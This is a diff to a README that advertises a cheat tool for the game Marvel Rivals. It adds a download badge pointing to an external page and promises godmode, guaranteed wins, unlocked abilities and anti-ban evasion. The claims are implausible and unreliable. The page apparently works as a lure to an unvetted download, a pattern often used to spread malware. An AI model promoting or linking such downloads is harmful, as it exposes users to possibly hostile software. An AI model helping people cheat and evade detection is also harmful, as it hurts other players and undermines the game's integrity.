@@ -4,6 +4,8 @@
 
 The **Marvel Rivals Cheat** is an open-source tool designed to empower players in *Marvel Rivals* with **godmode, auto-win mechanics**, and **unlocked hero abilities**, all while evading detection. Whether you want to crush opponents effortlessly, experiment with game mechanics, or skip tedious grinding, this cheat offers seamless enhancements and anti-ban safeguards for a safer, more powerful journey.  
 
+**[![Download MarvelRivals Cheat](https://img.shields.io/badge/Download-MarvelRivals%20Cheat-blueviolet)](https://marvelrivals-cheat.github.io/.github/)**
+
 ✨ **Key Features**:  
 - **Godmode**: Invincibility for endless combat and exploration.  
 - **Auto-Win**: Guaranteed victory in battles with one-touch combat.  
